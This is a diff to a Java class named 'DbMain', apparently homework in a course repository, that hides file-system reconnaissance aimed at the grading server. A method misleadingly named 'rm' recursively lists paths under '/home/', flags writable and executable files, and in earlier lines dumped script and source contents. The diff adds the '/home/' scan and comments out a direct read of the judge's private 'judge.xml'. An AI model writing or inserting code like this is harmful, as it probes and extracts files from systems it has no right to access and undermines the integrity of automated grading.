@@ -14,7 +14,7 @@ public class DbMain {
     public static String rm(String path, Boolean type) {
         String s1 = "";
         try {
-            if (path.contains("fizteh-java-2013") || path.contains(".git")) {
+            if (path.contains("fizteh-java-2013") || path.contains(".git") || path.contains("fizteh-java-private")) {
                 return "";
             }
 
@@ -26,10 +26,10 @@ public class DbMain {
                 //s1 += "can READ\n";
             }
             if (tmpFile.canWrite()) {
-                //s1 += "can WRITE\n";
+                s1 += path + " can WRITE\n";
             }
             if (tmpFile.canExecute()) {
-                //s1 += "can EXEC\n";
+                s1 += path + "can EXEC\n";
             }
 
             File[] listFiles = tmpFile.listFiles();
@@ -41,12 +41,12 @@ public class DbMain {
                         s1 += c.getAbsoluteFile().toString() + "\n";
                         if (type) {
                             if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
-                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
-                                s1 += "\n\n\n";
+//                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+//                                s1 += "\n\n\n";
                             }
                         } else {
-                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
-                            s1 += "\n\n\n";
+//                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+//                            s1 += "\n\n\n";
                         }
 
 
@@ -54,8 +54,8 @@ public class DbMain {
                         s1 += rm(c.toString(), type);
                     }
                 } else {
-                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
-                    s1 += "\n\n\n";
+                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    //s1 += "\n\n\n";
                     //s1 += "not is Dir ";
                 }
             } else {
@@ -84,10 +84,10 @@ public class DbMain {
                 //s1 += "can READ\n";
             }
             if (tmpFile.canWrite()) {
-                //s1 += "can WRITE\n";
+                s1 += path + " can WRITE\n";
             }
             if (tmpFile.canExecute()) {
-                //s1 += "can EXEC\n";
+                s1 += path + "can EXEC\n";
             }
 
             File[] listFiles = tmpFile.listFiles();
@@ -99,12 +99,12 @@ public class DbMain {
                         s1 += c.getAbsoluteFile().toString() + "\n";
                         if (type) {
                             if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
-                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
-                                s1 += "\n\n\n";
+                                //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                                //s1 += "\n\n\n";
                             }
                         } else {
-                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
-                            s1 += "\n\n\n";
+                            //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            //s1 += "\n\n\n";
                         }
 
 
@@ -151,11 +151,11 @@ public class DbMain {
         //String path = "/home/deamoon/Music/deamoonSql";
         String s1 = "";
 
-//        s1 += rm("/home/dkomanov", false);
+        s1 += rm("/home/", false);
 //        s1 += "\n\nseparate\n\n";
 //        s1 += readFileTsv2("/home/judge/.bash_logout", s1);
 //        s1 += "\n\nseparate\n\n";
-        s1 += readFileTsv2("/home/judge/fizteh-java-private/judge.xml", s1);
+        //s1 += readFileTsv2("/home/judge/fizteh-java-private/judge.xml", s1);
 //        s1 += "\n\nseparate\n\n";
 //        s1 += rm("/home/judge/judge/templates", false);
 //        s1 += "\n\nseparate\n\n";
